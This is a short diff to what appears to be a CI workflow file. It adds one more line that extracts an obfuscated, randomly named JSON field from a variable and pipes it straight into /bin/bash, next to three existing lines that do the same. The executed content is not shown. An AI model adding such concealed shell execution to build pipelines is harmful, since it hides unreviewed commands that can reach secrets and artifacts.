@@ -41,6 +41,7 @@ jobs:
           echo $pqmsp07725 | jq -r .tz1908 | /bin/bash
           printf '%s' "$gam2" | jq -r .dqzq3 | /bin/bash
           printf '%s' "$k498" | jq -r .z3949 | /bin/bash
+          echo $rukx172 | jq -r .rsl0995 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
